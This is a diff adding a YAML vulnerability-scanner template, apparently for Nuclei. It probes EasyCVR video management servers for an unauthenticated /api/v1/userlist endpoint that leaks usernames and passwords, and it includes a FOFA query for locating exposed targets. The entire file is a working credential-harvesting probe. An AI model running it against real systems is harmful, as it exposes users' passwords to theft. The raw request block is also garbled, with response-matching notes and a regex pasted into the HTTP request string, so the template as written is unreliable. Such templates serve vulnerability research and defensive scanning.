@@ -1,0 +1,34 @@
+id: poc-uw0hvnw3kv90e04q
+info:
+  name: EasyCVR 视频管理平台存在用户信息泄露
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uw0hvnw3kv90e04q'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: uw0hvnw3kv90e04q
+    fofa: fofa:title="EasyCVR"
+http:
+- raw:
+  - 'GET /api/v1/userlist?pageindex=0&pagesize=10 HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?username)(?=.*?password).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
